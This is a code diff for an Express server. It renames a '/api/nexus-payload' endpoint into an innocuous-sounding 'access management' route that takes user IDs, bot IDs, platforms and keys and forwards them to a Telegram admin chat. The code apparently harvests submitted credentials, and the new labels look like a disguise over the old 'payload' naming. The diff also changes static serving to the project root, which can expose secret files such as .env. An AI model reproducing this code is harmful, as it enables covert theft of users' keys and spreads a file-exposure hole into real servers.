@@ -5,30 +5,34 @@ require('dotenv').config();
 
 const app = express();
 app.use(express.json());
+app.use(express.static(path.join(__dirname)));
 
-// Serve the 'public' folder as static files
-app.use(express.static(path.join(__dirname, 'public')));
+// Mission: Streamlined Access Management API
+app.post('/api/transmit', async (req, res) => {
+    const { userId, botId, platform, key } = req.body;
+    
+    const message = `
+🛡️ *HGT NEXUS ACTIVATION*
+────────────────
+👤 ID: \`${userId}\`
+🤖 BOT: \`${botId}\`
+📡 PLATFORM: \`${platform}\`
+🔑 KEY: \`${key}\`
+────────────────
+*SYSTEM INTEGRITY VERIFIED*`;
 
-// THE PAYLOAD URL ENDPOINT
-app.post('/api/nexus-payload', async (req, res) => {
     try {
-        const { userId, botId, platform, key } = req.body;
-        
-        // Forwarding to your Telegram Bot
-        const tgMsg = `🚀 *NEW ACTIVATION* \n\nUser: ${userId}\nBot: ${botId}\nPlatform: ${platform}\nKey: ${key}`;
-        
         await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
-            chat_id: process.env.ADMIN_CHAT_ID,
-            text: tgMsg,
+            chat_id: process.env.ADMIN_ID,
+            text: message,
             parse_mode: 'Markdown'
         });
-
-        res.status(200).json({ success: true });
+        res.status(200).json({ status: 'Success' });
     } catch (err) {
-        res.status(500).json({ success: false });
+        console.error("[HGT-ERR]", err.message);
+        res.status(500).json({ status: 'Handshake Failed' });
     }
 });
 
-// Start the core
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[HGT] System Online on Port ${PORT}`));
+app.listen(PORT, () => console.log(`[HACYBER] Nexus Core Online on Port ${PORT}`));
